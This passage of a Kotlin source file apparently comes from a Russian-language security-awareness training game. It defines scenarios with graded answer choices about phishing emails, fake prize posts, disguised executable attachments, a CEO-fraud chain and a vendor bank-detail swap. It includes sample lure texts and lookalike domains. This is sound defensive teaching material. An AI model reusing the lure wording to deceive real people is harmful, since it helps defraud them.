package com.guardsim.scenario

import com.guardsim.scenario.internal.AttackBreakdown
import com.guardsim.scenario.internal.AttackTechnique
import com.guardsim.scenario.internal.InternalChoice
import com.guardsim.scenario.internal.InternalHotspot
import com.guardsim.scenario.internal.InternalInvestigationPanel
import com.guardsim.scenario.internal.InternalRedFlagCandidate
import com.guardsim.scenario.internal.InternalRedFlagGame
import com.guardsim.scenario.ScenarioHubChannel
import com.guardsim.scenario.internal.InternalScenario
import com.guardsim.scenario.internal.InternalStep
import com.guardsim.scenario.internal.InternalNetShieldGame
import com.guardsim.scenario.internal.InternalNetShieldRow
import com.guardsim.scenario.internal.InternalSerpPickGame
import com.guardsim.scenario.internal.InternalSerpResult
import com.guardsim.scenario.internal.InternalUrlCompareGame
import com.guardsim.scenario.internal.InternalPhoneCallOverlay
import com.guardsim.scenario.internal.InternalPhoneIncidentGame
import com.guardsim.scenario.internal.InternalPhoneSmsLine
import com.guardsim.scenario.internal.InternalVirusTotalGame
import com.guardsim.scenario.internal.StepUiKind
import org.springframework.stereotype.Component

@Component
class ScenarioRegistry {

    private val byId: Map<String, InternalScenario> = buildAll().associateBy { it.id }

    fun all(): Collection<InternalScenario> = byId.values

    fun findById(id: String): InternalScenario? = byId[id]

    private companion object {
        fun buildAll(): List<InternalScenario> {
            val featured = listOf(
                aptSilentAgent(),
                terminalTrojanScript(),
                oauthConsentTrap(),
                searchBankOfficialSerp(),
                perimeterDdosNetShield(),
                vpnColleagueVirustotalClean(),
                winlockerSafeModeCleanup(),
                ratIncidentResponse(),
                smsBomberPhishingSmokescreen(),
            )
            val legacy = listOf(
                phishingEmail(),
                socialPrizeScam(),
                maliciousAttachment(),
                combinedAttack(),
                vendorPaymentBec(),
                marketplaceOffPlatform(),
                hrPortalPhish(),
                itSupportLookalike(),
                execWireVishing(),
                messengerForwardedPhish(),
                calendarFakeTeamsInvite(),
                extensionCorporateMailTrap(),
                messengerInternalBenign(),
                calendarLegitInvite(),
                extensionAllowlistBenign(),
                emailItMaintenanceBenign(),
                consumerBankSmishingAndFakeSite(),
                consumerBankVishing(),
                credentialStuffingPhishEmail(),
                personalRequisitesScamMessenger(),
            )
            return legacy + featured
        }

        /** Фишинговое письмо «срочная смена пароля». */
        fun phishingEmail(): InternalScenario = InternalScenario(
            id = "phishing-email",
            title = "Срочное письмо от «банка»",
            type = ScenarioType.EMAIL,
            description = "Проверьте, как вы распознаёте фишинг в почте и что делать с подозрительными письмами.",
            attackTypeLabel = "Фишинг (e-mail, поддельный сайт)",
            steps = listOf(
                InternalStep(
                    id = "pe-1",
                    situationBrief = """
                        Рабочий день: вы открыли корпоративную почту. На экране — новое письмо с пугающей темой.
                        Ниже — симуляция окна почты: тема, отправитель, текст и отвлекающий «шум» внизу.
                    """.trimIndent(),
                    narrative = """
                        Текст письма: «Доступ к счёту будет заблокирован через 24 часа. Не откладывайте — воспользуйтесь ссылкой ниже, чтобы подтвердить личность.»
                        Ссылка в теле: «Восстановить доступ».
                    """.trimIndent(),
                    choices = listOf(
                        InternalChoice(
                            id = "pe-1-a",
                            label = "Сразу перейду по ссылке, чтобы не потерять доступ",
                            correct = false,
                            explanationWhenChosen = "Переход по ссылке из панического письма — типичный вектор фишинга. Сначала нужно остановиться и проверить источник.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Вы попали на поддельную страницу входа. Сессия могла быть перехвачена — срочно смените пароль по официальному каналу и сообщите в ИБ.",
                        ),
                        InternalChoice(
                            id = "pe-1-b",
                            label = "Остановлюсь: проверю отправителя и адрес ссылки, не кликая",
                            correct = true,
                            explanationWhenChosen = "Верно: при срочности и давлении злоумышленник рассчитывает на импульсивный клик. Сначала оценка, не действие.",
                            scoreDelta = 3,
                        ),
                        InternalChoice(
                            id = "pe-1-c",
                            label = "Отвечу на письмо и спрошу, настоящее ли это",
                            correct = false,
                            explanationWhenChosen = "Ответ на фишинг может подтвердить активность ящика. Надёжнее — проверить канал через официальный сайт или приложение банка, а не через это письмо.",
                            scoreDelta = 0,
                        ),
                    ),
                    uiKind = StepUiKind.EMAIL_CLIENT,
                    emailSubject = "СРОЧНО: блокировка счёта через 24 часа",
                    emailFrom = "Security Team <noreply-secure@bank-pay-support.ru>",
                    investigationPanels = listOf(
                        InternalInvestigationPanel(
                            id = "pe-1-hdr",
                            title = "Служебные подсказки",
                            body = "SPF/DKIM для домена bank-pay-support.ru не совпадает с официальным банком. Частый признак подделки.",
                        ),
                        InternalInvestigationPanel(
                            id = "pe-1-pol",
                            title = "Политика компании",
                            body = "П. 4.2: не переходить по ссылкам о блокировке счёта из внешней почты без звонка в банк по номеру с карты.",
                        ),
                    ),
                    investigationBonusThreshold = 1,
                    hotspots = listOf(
                        InternalHotspot(
                            id = "pe-1-hs-link",
                            label = "Ссылка «Восстановить доступ»",
                            choiceId = "pe-1-a",
                            variant = "LINK",
                        ),
                        InternalHotspot(
                            id = "pe-1-hs-from",
                            label = "Строка «От кого»",
                            choiceId = "pe-1-b",
                            variant = "FROM",
                        ),
                        InternalHotspot(
                            id = "pe-1-hs-reply",
                            label = "Кнопка «Ответить»",
                            choiceId = "pe-1-c",
                            variant = "REPLY",
                        ),
                    ),
                    narrativeNoise = """
                        ---
                        Рассылка #88291-A · Контроль качества. Если вы не инициировали запрос, удалите письмо.
                        ООО «ФинТех Сервис» · Линия поддержки 8-800-000-00-00 (звонок бесплатный).
                        Настоящим сообщением вы подтверждаете ознакомление с условиями. © 2024
                    """.trimIndent(),
                    pressureSeconds = 75,
                    redFlagGame = InternalRedFlagGame(
                        instruction = "Отметьте ровно два признака, которые реально должны насторожить (не всё необычное — угроза и источник).",
                        requiredPickCount = 2,
                        candidates = listOf(
                            InternalRedFlagCandidate(
                                id = "pe-1-rf-1",
                                label = "Давление и срочность: «блокировка через 24 часа»",
                                isRedFlag = true,
                            ),
                            InternalRedFlagCandidate(
                                id = "pe-1-rf-2",
                                label = "Отправитель с домена, не похожего на официальный банк",
                                isRedFlag = true,
                            ),
                            InternalRedFlagCandidate(
                                id = "pe-1-d-1",
                                label = "В тексте нет грамматических ошибок",
                                isRedFlag = false,
                            ),
                            InternalRedFlagCandidate(
                                id = "pe-1-d-2",
                                label = "Есть призыв перейти по ссылке (само по себе не отдельный «красный флаг» в этой игре — смотрим срочность и домен)",
                                isRedFlag = false,
                            ),
                            InternalRedFlagCandidate(
                                id = "pe-1-d-3",
                                label = "Письмо пришло на рабочий адрес",
                                isRedFlag = false,
                            ),
                        ),
                    ),
                ),
                InternalStep(
                    id = "pe-2",
                    situationBrief = """
                        Нужно сравнить два URL так, как будто вы смотрите на адресную строку браузера перед входом.
                        Ниже — упрощённое «окно» с двумя вариантами и отвлекающими подсказками, как на реальной странице.
                    """.trimIndent(),
                    narrative = "Сравните адреса ниже. Откройте вкладки расследования — там подсказки. Затем выберите адрес, на котором готовы действовать первым.",
                    choices = listOf(
                        InternalChoice(
                            id = "pe-2-a",
                            label = "Всё равно зайду — может, это зеркало банка",
                            correct = false,
                            explanationWhenChosen = "Банки не просят входить через посторонние домены. Такой адрес почти наверняка фишинг.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Фальшивая страница зафиксировала попытку входа. Немедленно сообщите в ИБ и не используйте тот же пароль на других сервисах.",
                        ),
                        InternalChoice(
                            id = "pe-2-b",
                            label = "Не перехожу; открою приложение банка или наберу номер с официального сайта",
                            correct = true,
                            explanationWhenChosen = "Правильно: доверять только проверенным каналам, а не ссылке из письма.",
                            scoreDelta = 4,
                        ),
                        InternalChoice(
                            id = "pe-2-c",
                            label = "Перешлю письмо всем коллегам, чтобы предупредить",
                            correct = false,
                            explanationWhenChosen = "Распространение подозрительного письма может навредить. Лучше сообщить в IT/безопасность одним каналом или пометить как спам/фишинг.",
                            scoreDelta = 0,
                        ),
                    ),
                    uiKind = StepUiKind.MINI_URL_COMPARE,
                    investigationPanels = listOf(
                        InternalInvestigationPanel(
                            id = "pe-2-whois",
                            title = "Справка по доменам",
                            body = "bank-secure-login-verify.net — молодой домен; id.bank.example.com в зоне организации и совпадает с официальными каналами.",
                        ),
                    ),
                    investigationBonusThreshold = 1,
                    urlCompareGame = InternalUrlCompareGame(
                        leftUrl = "https://id.bank.example.com/auth/login",
                        rightUrl = "https://bank-secure-login-verify.net/auth/login",
                        leftChoiceId = "pe-2-b",
                        rightChoiceId = "pe-2-a",
                        caption = "Левый адрес — официальный поддомен; правый — сторонний. Нажмите тот, с которым поступили бы на практике.",
                    ),
                    narrativeNoise = """
                        Всплывающий баннер на странице: «Оформите кредит за 2 минуты — 89% одобрений».
                        Подсказка браузера: «Подключение защищено» — это не гарантирует, что сайт настоящий.
                    """.trimIndent(),
                    pressureSeconds = 50,
                ),
                InternalStep(
                    id = "pe-3",
                    situationBrief = "Вы уже поняли, что письмо подозрительное. Остаётся выбрать правильное завершающее действие.",
                    narrative = "Что сделать с этим письмом после того, как вы убедились, что оно подозрительное?",
                    choices = listOf(
                        InternalChoice(
                            id = "pe-3-a",
                            label = "Удалю и при возможности помечу как фишинг / сообщу в службу безопасности",
                            correct = true,
                            explanationWhenChosen = "Так вы защищаете себя и помогаете организации учиться на инцидентах.",
                            scoreDelta = 3,
                        ),
                        InternalChoice(
                            id = "pe-3-b",
                            label = "Просто удалю молча",
                            correct = false,
                            explanationWhenChosen = "Удаление полезно, но пометка «фишинг» и уведомление ИБ улучшают фильтры и статистику.",
                            scoreDelta = 0,
                        ),
                        InternalChoice(
                            id = "pe-3-c",
                            label = "Оставлю в папке «на будущее»",
                            correct = false,
                            explanationWhenChosen = "Хранить фишинг в почте рискованно: можно случайно перейти позже. Лучше удалить после реакции.",
                            scoreDelta = 0,
                        ),
                    ),
                    uiKind = StepUiKind.EMAIL_CLIENT,
                    emailSubject = "Подозрительное письмо",
                    emailFrom = "—",
                    hotspots = listOf(
                        InternalHotspot(
                            id = "pe-3-h-a",
                            label = "Удалю и помечу как фишинг / сообщу в ИБ",
                            choiceId = "pe-3-a",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "pe-3-h-b",
                            label = "Просто удалю молча",
                            choiceId = "pe-3-b",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "pe-3-h-c",
                            label = "Оставлю в папке «на будущее»",
                            choiceId = "pe-3-c",
                            variant = "ACTION",
                        ),
                    ),
                ),
            ),
            attackBreakdown = AttackBreakdown(
                summary = "Классический фишинг: поддельное письмо + фейковая страница входа для кражи пароля.",
                techniques = listOf(
                    AttackTechnique("T1566.001", "Spearphishing Link", "Initial Access",
                        "Письмо имитирует официальное уведомление банка со ссылкой на поддельный сайт входа."),
                    AttackTechnique("T1204.001", "Malicious Link", "Execution",
                        "Жертву подталкивают кликнуть ссылку и ввести учётные данные на фишинговом домене."),
                ),
                howToDefend = "Проверяй домен в адресной строке (не в письме), испол��зуй 2FA — даже если пароль украден, вход не удастся. Сомнительные письма — немедленно в службу ИБ.",
            ),
        )

        /** Соцсеть: «вы выиграли», просьба ввести пароль. */
        fun socialPrizeScam(): InternalScenario = InternalScenario(
            id = "social-prize",
            title = "«Поздравляем» во ВКонтакте",
            type = ScenarioType.SOCIAL,
            description = "Разбор типичной схемы в соцсети: фальшивые розыгрыши и кража учётных данных.",
            attackTypeLabel = "Фишинг / ложный розыгрыш",
            steps = listOf(
                InternalStep(
                    id = "sp-1",
                    situationBrief = """
                        Вы листаете ленту соцсети. Всплыл пост о «выигрыше» — типичная схема.
                        Ниже — упрощённый экран ленты: текст поста и элементы, по которым можно «нажать».
                    """.trimIndent(),
                    narrative = """
                        Пост в ленте: «Поздравляем! Вы выиграли айфон. Нажмите «Получить приз», чтобы войти и подтвердить доставку.»
                        Аккаунт без галочки, мало подписчиков.
                    """.trimIndent(),
                    choices = listOf(
                        InternalChoice(
                            id = "sp-1-a",
                            label = "Перейду по ссылке и введу логин и пароль, как просят",
                            correct = false,
                            explanationWhenChosen = "Ввод пароля на стороннем сайте после такого сообщения — прямой путь к компрометации аккаунта.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Форма «подтверждения приза» — клон логина. Доступ к аккаунту мог быть передан третьим лицам. Срочно смените пароль и включите 2FA.",
                        ),
                        InternalChoice(
                            id = "sp-1-b",
                            label = "Проверю официальные каналы сети и не введу данные на стороннем сайте",
                            correct = true,
                            explanationWhenChosen = "Розыгрыши не требуют «подтверждения» паролем на незнакомом домене.",
                            scoreDelta = 4,
                        ),
                        InternalChoice(
                            id = "sp-1-c",
                            label = "Отправлю ссылку другу спросить, реально ли это",
                            correct = false,
                            explanationWhenChosen = "Ссылку лучше не распространять. Сначала независимая проверка без перехода.",
                            scoreDelta = 0,
                        ),
                    ),
                    uiKind = StepUiKind.SOCIAL_NOTIFICATION,
                    investigationPanels = listOf(
                        InternalInvestigationPanel(
                            id = "sp-1-profile",
                            title = "Карточка страницы",
                            body = "Страница создана 3 дня назад, нет ссылки на официальный сайт сети, только внешняя короткая ссылка в посте.",
                        ),
                    ),
                    investigationBonusThreshold = 1,
                    hotspots = listOf(
                        InternalHotspot(
                            id = "sp-1-prize",
                            label = "Кнопка «Получить приз»",
                            choiceId = "sp-1-a",
                            variant = "LINK",
                        ),
                        InternalHotspot(
                            id = "sp-1-app",
                            label = "Открыть официальное приложение / не переходить",
                            choiceId = "sp-1-b",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "sp-1-share",
                            label = "Поделиться / отправить другу",
                            choiceId = "sp-1-c",
                            variant = "SHARE",
                        ),
                    ),
                ),
                InternalStep(
                    id = "sp-2",
                    situationBrief = "По ссылке из поста открылась страница, похожая на вход в соцсеть. Нужно решить, вводить ли пароль.",
                    narrative = """
                        Сайт по ссылке визуально похож на форму входа соцсети и просит пароль «для подтверждения приза».
                        Что ответить себе внутренне, прежде чем что-либо вводить?
                    """.trimIndent(),
                    choices = listOf(
                        InternalChoice(
                            id = "sp-2-a",
                            label = "Если выглядит как настоящий вход — можно ввести",
                            correct = false,
                            explanationWhenChosen = "Фишинг часто копирует дизайн. Решают домен в адресной строке и контекст (кто прислал ссылку).",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                        ),
                        InternalChoice(
                            id = "sp-2-b",
                            label = "Любой запрос пароля вне официального приложения/сайта — красный флаг; закрываю вкладку",
                            correct = true,
                            explanationWhenChosen = "Правильная модель: пароль только там, где вы сами открыли известный адрес или приложение.",
                            scoreDelta = 4,
                        ),
                        InternalChoice(
                            id = "sp-2-c",
                            label = "Введу старый пароль «для проверки»",
                            correct = false,
                            explanationWhenChosen = "Даже «старый» пароль раскрывает привычки и может совпасть с другими сервисами.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                        ),
                    ),
                    uiKind = StepUiKind.SOCIAL_NOTIFICATION,
                    hotspots = listOf(
                        InternalHotspot(
                            id = "sp-2-h-a",
                            label = "Ввести пароль — выглядит как настоящий вход",
                            choiceId = "sp-2-a",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "sp-2-h-b",
                            label = "Закрыть: пароль только в официальном приложении",
                            choiceId = "sp-2-b",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "sp-2-h-c",
                            label = "Ввести старый пароль «для проверки»",
                            choiceId = "sp-2-c",
                            variant = "ACTION",
                        ),
                    ),
                ),
                InternalStep(
                    id = "sp-3",
                    situationBrief = "Завершающий шаг сценария: что важнее для защиты аккаунта в долгую.",
                    narrative = "Какое долгосрочное действие снизит риск захвата аккаунта?",
                    choices = listOf(
                        InternalChoice(
                            id = "sp-3-a",
                            label = "Включить двухфакторную аутентификацию (2FA)",
                            correct = true,
                            explanationWhenChosen = "2FA резко усложняет вход мошенникам даже при утечке пароля.",
                            scoreDelta = 3,
                        ),
                        InternalChoice(
                            id = "sp-3-b",
                            label = "Ничего не делать, если пароль сложный",
                            correct = false,
                            explanationWhenChosen = "Сложный пароль не заменяет 2FA и не защищает от фишинга, если его вводят на поддельной странице.",
                            scoreDelta = 0,
                        ),
                        InternalChoice(
                            id = "sp-3-c",
                            label = "Публиковать меньше фото",
                            correct = false,
                            explanationWhenChosen = "Приватность важна, но для защиты входа ключевыми являются 2FA и осторожность со ссылками.",
                            scoreDelta = 0,
                        ),
                    ),
                    uiKind = StepUiKind.SOCIAL_NOTIFICATION,
                    hotspots = listOf(
                        InternalHotspot(
                            id = "sp-3-h-a",
                            label = "Включить двухфакторную аутентификацию (2FA)",
                            choiceId = "sp-3-a",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "sp-3-h-b",
                            label = "Ничего не делать, если пароль сложный",
                            choiceId = "sp-3-b",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "sp-3-h-c",
                            label = "Публиковать меньше фото",
                            choiceId = "sp-3-c",
                            variant = "ACTION",
                        ),
                    ),
                ),
            ),
        )

        /** Вредоносное вложение. */
        fun maliciousAttachment(): InternalScenario = InternalScenario(
            id = "malicious-attachment",
            title = "Странный счёт во вложении",
            type = ScenarioType.EMAIL,
            description = "Поведение с подозрительными вложениями: двойные расширения и неожиданные файлы.",
            attackTypeLabel = "Вредоносное вложение",
            steps = listOf(
                InternalStep(
                    id = "ma-1",
                    situationBrief = "В почте неожиданное письмо со счётом и подозрительным вложением — ниже текст письма, как в окне клиента.",
                    narrative = """
                        Письмо от неизвестного адреса: «счёт за услуги», вложение называется invoice.pdf.exe.
                        Какая первая реакция правильная?
                    """.trimIndent(),
                    choices = listOf(
                        InternalChoice(
                            id = "ma-1-a",
                            label = "Открою вложение — вдруг это реальный счёт",
                            correct = false,
                            explanationWhenChosen = "Двойное расширение .pdf.exe часто маскирует программу. Не открывать незапрошенные вложения от незнакомых отправителей.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                        ),
                        InternalChoice(
                            id = "ma-1-b",
                            label = "Не открываю; проверяю отправителя и при сомнении удаляю / сообщаю в ИБ",
                            correct = true,
                            explanationWhenChosen = "Остановка и проверка контекста — базовый алгоритм перед любым вложением.",
                            scoreDelta = 4,
                        ),
                        InternalChoice(
                            id = "ma-1-c",
                            label = "Сохраню на рабочий стол и отсканирую «на глаз»",
                            correct = false,
                            explanationWhenChosen = "Даже сохранение может запустить вредонос в некоторых средах. Лучше не взаимодействовать до проверки политикой и ИБ.",
                            scoreDelta = 0,
                        ),
                    ),
                    uiKind = StepUiKind.EMAIL_CLIENT,
                    emailSubject = "Счёт за услуги",
                    emailFrom = "billing-unknown@sender.ru",
                    hotspots = listOf(
                        InternalHotspot(
                            id = "ma-1-att",
                            label = "Открыть вложение invoice.pdf.exe",
                            choiceId = "ma-1-a",
                            variant = "ATTACHMENT",
                        ),
                        InternalHotspot(
                            id = "ma-1-safe",
                            label = "Не открывать; проверить отправителя / ИБ",
                            choiceId = "ma-1-b",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "ma-1-save",
                            label = "Сохранить на рабочий стол",
                            choiceId = "ma-1-c",
                            variant = "ACTION",
                        ),
                    ),
                ),
                InternalStep(
                    id = "ma-2",
                    situationBrief = "Есть контекст от коллеги, но файл по-прежнему выглядит опасно — нужно выбрать безопасный следующий шаг.",
                    narrative = """
                        Коллега говорит, что ждёт настоящий счёт по проекту, но имя файла всё ещё invoice.pdf.exe,
                        а отправитель — личная почта, не корпоративная. Что делать?
                    """.trimIndent(),
                    choices = listOf(
                        InternalChoice(
                            id = "ma-2-a",
                            label = "Попрошу коллегу прислать файл через корпоративный канал или облако с политикой",
                            correct = true,
                            explanationWhenChosen = "Надёжнее получить контролируемый канал с проверкой личности, чем доверять сомнительному вложению.",
                            scoreDelta = 4,
                        ),
                        InternalChoice(
                            id = "ma-2-b",
                            label = "Открою, раз коллега подтвердил ожидание счёта",
                            correct = false,
                            explanationWhenChosen = "Социальная инженерия использует контекст. Подтверждение должно быть по второму каналу и без опасного файла.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                        ),
                        InternalChoice(
                            id = "ma-2-c",
                            label = "Перешлю вложение антивирусу на домашнем ПК",
                            correct = false,
                            explanationWhenChosen = "Корпоративные правила обычно требуют официальных средств сканирования и ИБ, не самодеятельности.",
                            scoreDelta = 0,
                        ),
                    ),
                    uiKind = StepUiKind.EMAIL_CLIENT,
                    emailSubject = "Re: счёт по проекту",
                    emailFrom = "colleague@personal-mail.ru",
                    hotspots = listOf(
                        InternalHotspot(
                            id = "ma-2-att",
                            label = "Открыть вложение invoice.pdf.exe",
                            choiceId = "ma-2-b",
                            variant = "ATTACHMENT",
                        ),
                        InternalHotspot(
                            id = "ma-2-channel",
                            label = "Запросить файл через корпоративный канал",
                            choiceId = "ma-2-a",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "ma-2-fwd",
                            label = "Переслать вложение на домашний ПК",
                            choiceId = "ma-2-c",
                            variant = "ACTION",
                        ),
                    ),
                ),
            ),
        )

        /** Комбинированная цепочка: «гендиректор», срочность, вложение и поддельный сервис. */
        fun combinedAttack(): InternalScenario = InternalScenario(
            id = "combined-ceo-phish",
            title = "«Срочно от гендиректора»: цепочка атаки",
            type = ScenarioType.EMAIL,
            description = "Комбинированный инцидент: поддельный авторитет, вредоносное вложение и фишинговая ссылка. Для роли администратора безопасности.",
            attackTypeLabel = "Комбинированная атака (BEC, вложение, фишинг)",
            hubChannel = ScenarioHubChannel.SECURITY,
            steps = listOf(
                InternalStep(
                    id = "cb-1",
                    situationBrief = """
                        В системе тикетов ИБ открыт инцидент: переслано письмо «от руководителя» с вложением и срочностью.
                        Ниже — экран тикета с описанием и элементами, с которыми можно взаимодействовать.
                    """.trimIndent(),
                    narrative = """
                        Тело тикета: письмо якобы от генерального директора с личного ящика — «Срочно: выплаты сегодня до 18:00».
                        Во вложении файл payroll_q4.xlsm.exe и просьба «открыть и подтвердить реквизиты». Первое действие?
                    """.trimIndent(),
                    choices = listOf(
                        InternalChoice(
                            id = "cb-1-a",
                            label = "Открою вложение, чтобы не задержать выплаты",
                            correct = false,
                            explanationWhenChosen = "Исполнимый файл под видом таблицы — красный флаг. Срочность и «личная почта руководителя» усиливают социальную инженерию.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Песочница почти не помогла: макрос запросил доступ к сети. SOC зафиксировал вредоносную активность от вашего узла.",
                        ),
                        InternalChoice(
                            id = "cb-1-b",
                            label = "Не открываю; проверю через корпоративный каталог и второй канал (телефон/мессенджер с проверкой)",
                            correct = true,
                            explanationWhenChosen = "Любая срочность по деньгам подтверждается независимым каналом, а не вложением из незнакомого адреса.",
                            scoreDelta = 4,
                        ),
                        InternalChoice(
                            id = "cb-1-c",
                            label = "Отвечу на письмо и пришлю реквизиты, чтобы ускорить процесс",
                            correct = false,
                            explanationWhenChosen = "Утечка реквизитов и диалог с мошенником напрямую вредят компании и доверию клиентов.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Реквизиты попали в руки мошенников. Финансовый отдел и клиенты могут столкнуться с последствиями.",
                        ),
                    ),
                    uiKind = StepUiKind.DESK_TICKET,
                    emailSubject = "Инцидент: срочное письмо «CEO» и вложение",
                    emailFrom = "Тикет-система ИБ · приоритет: высокий",
                    investigationPanels = listOf(
                        InternalInvestigationPanel(
                            id = "cb-1-meta",
                            title = "Метаданные вложения",
                            body = "Расширение .xlsm.exe — маскировка: исполняемый файл под видом таблицы. Корпоративная политика: не запускать.",
                        ),
                    ),
                    investigationBonusThreshold = 1,
                    hotspots = listOf(
                        InternalHotspot(
                            id = "cb-1-att",
                            label = "Вложение payroll_q4.xlsm.exe",
                            choiceId = "cb-1-a",
                            variant = "ATTACHMENT",
                        ),
                        InternalHotspot(
                            id = "cb-1-verify",
                            label = "Позвонить / второй канал, не открывая файл",
                            choiceId = "cb-1-b",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "cb-1-reply",
                            label = "Ответить отправителю с реквизитами",
                            choiceId = "cb-1-c",
                            variant = "REPLY",
                        ),
                    ),
                ),
                InternalStep(
                    id = "cb-2",
                    situationBrief = "В цепочке письма есть ссылка на подписание — нужно решить, переходить ли по ней под давлением срочности.",
                    narrative = """
                        В том же письме ссылка «подписать в DocuSign» ведёт на домен docu-sign-verify.net/forms…
                        Настройка и текст письма давят на скорость. Ваш шаг?
                    """.trimIndent(),
                    choices = listOf(
                        InternalChoice(
                            id = "cb-2-a",
                            label = "Перейду и подпишу, раз «CEO» ждёт",
                            correct = false,
                            explanationWhenChosen = "Поддельные страницы входа часто маскируются под известные сервисы. Решает официальный домен и самостоятельно открытый сайт.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Поддельная страница DocuSign скопировала учётные данные. Аккаунт и корпоративные подписи под угрозой.",
                        ),
                        InternalChoice(
                            id = "cb-2-b",
                            label = "Не перехожу; сообщаю в ИБ и использую только корпоративные процессы подписания",
                            correct = true,
                            explanationWhenChosen = "Цепочка «вложение + фальш-DocuSign» типична: каждый шаг проверяется политикой, а не ссылкой из письма.",
                            scoreDelta = 4,
                        ),
                        InternalChoice(
                            id = "cb-2-c",
                            label = "Перешлю ссылку в общий чат, чтобы кто-то другой проверил",
                            correct = false,
                            explanationWhenChosen = "Распространение вредоносной цепочки увеличивает ущерб и снижает доверие.",
                            scoreDelta = 0,
                        ),
                    ),
                    uiKind = StepUiKind.MINI_URL_COMPARE,
                    urlCompareGame = InternalUrlCompareGame(
                        leftUrl = "https://docu-sign-verify.net/forms/sign/urgent-ceo",
                        rightUrl = "https://www.docusign.com",
                        leftChoiceId = "cb-2-a",
                        rightChoiceId = "cb-2-b",
                        caption = "Левый URL — из письма (поддельный домен). Правый — официальный сайт DocuSign. Нажмите тот вариант, который соответствует вашему решению.",
                    ),
                ),
                InternalStep(
                    id = "cb-3",
                    situationBrief = "Инцидент классифицирован. Нужно выбрать действие, которое лучше защищает репутацию компании и клиентов.",
                    narrative = "Сценарий подтверждён как вредоносный. Что важнее всего для репутации компании и клиентов?",
                    choices = listOf(
                        InternalChoice(
                            id = "cb-3-a",
                            label = "Зафиксировать инцидент в ИБ, сохранить артефакты и проинформировать ответственных по регламенту",
                            correct = true,
                            explanationWhenChosen = "Прозрачная реакция организации защищает клиентов и восстанавливает доверие быстрее, чем скрытие.",
                            scoreDelta = 3,
                        ),
                        InternalChoice(
                            id = "cb-3-b",
                            label = "Удалю письмо и сделаю вид, что ничего не было",
                            correct = false,
                            explanationWhenChosen = "Молчание не останавливает атаку и ухудшает последствия для компании и клиентов.",
                            scoreDelta = 0,
                        ),
                        InternalChoice(
                            id = "cb-3-c",
                            label = "Оплачу «штраф» из письма малым переводом, чтобы закрыть вопрос",
                            correct = false,
                            explanationWhenChosen = "Любая оплата мошенникам по сценарию давления закрепляет угрозу и бьёт по репутации.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Перевод пошёл на счёт мошенников. Репутация компании в глазах клиентов резко упала.",
                        ),
                    ),
                    uiKind = StepUiKind.DESK_TICKET,
                    emailSubject = "Инцидент: реакция и репутация",
                    emailFrom = "Портал ИБ · пост-анализ",
                    hotspots = listOf(
                        InternalHotspot(
                            id = "cb-3-h-a",
                            label = "Зафиксировать в ИБ и проинформировать по регламенту",
                            choiceId = "cb-3-a",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "cb-3-h-b",
                            label = "Удалить следы и сделать вид, что ничего не было",
                            choiceId = "cb-3-b",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "cb-3-h-c",
                            label = "Оплатить «штраф» из письма",
                            choiceId = "cb-3-c",
                            variant = "ACTION",
                        ),
                    ),
                ),
            ),
        )

        /** BEC: «поставщик» меняет банковские реквизиты по email — реальная схема для переводов на счёт мошенников. */
        fun vendorPaymentBec(): InternalScenario = InternalScenario(
            id = "vendor-payment-bec",
            title = "«Поставщик» сменил реквизиты",
            type = ScenarioType.EMAIL,
            description = "Письмо якобы от контрагента с новыми банковскими данными. Так перехватывают реальные платежи B2B.",
            attackTypeLabel = "Подмена реквизитов (BEC)",
            steps = listOf(
                InternalStep(
                    id = "vb-1",
                    situationBrief = """
                        Вы ведёте закупки. В почте — письмо от «бухгалтерии поставщика»: срочно обновить реквизиты для ближайшего платежа.
                        Ниже — текст как в почтовом клиенте.
                    """.trimIndent(),
                    narrative = """
                        Тема: «Срочно: новые реквизиты для счёта № 4482».
                        Текст: просят с завтрашнего дня переводить на новый расчётный счёт; внизу ссылка на «обновлённый договор».
                        Отправитель: billing@acme-supplier-invoice.com (в договоре у вас указан домен acme-supplier.com).
                    """.trimIndent(),
                    choices = listOf(
                        InternalChoice(
                            id = "vb-1-a",
                            label = "Внесу новые реквизиты в учётную систему и запущу оплату — поставщик знакомый, тема письма совпадает со счётом",
                            correct = false,
                            explanationWhenChosen = "Знакомый бренд и срочность не заменяют проверку: мошенники подделывают домены (например, добавляют -invoice к имени сайта). Менять платёжные данные только по e-mail нельзя.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Платёж ушёл на счёт мошенников. Возврат средств не гарантирован, контрагент и аудит задают вопросы.",
                        ),
                        InternalChoice(
                            id = "vb-1-b",
                            label = "Позвоню в бухгалтерию поставщика по номеру из договора или из нашего справочника контрагента и сверю счёт — не используя телефоны и ссылки из письма",
                            correct = true,
                            explanationWhenChosen = "Верно: подтверждение реквизитов — только по каналу, который вы открыли сами (номер из договора, личный контакт менеджера), а не ответом на подозрительное письмо.",
                            scoreDelta = 4,
                        ),
                        InternalChoice(
                            id = "vb-1-c",
                            label = "Отвечу отправителю по e-mail и попрошу продублировать реквизиты «с официального корпоративного ящика»",
                            correct = false,
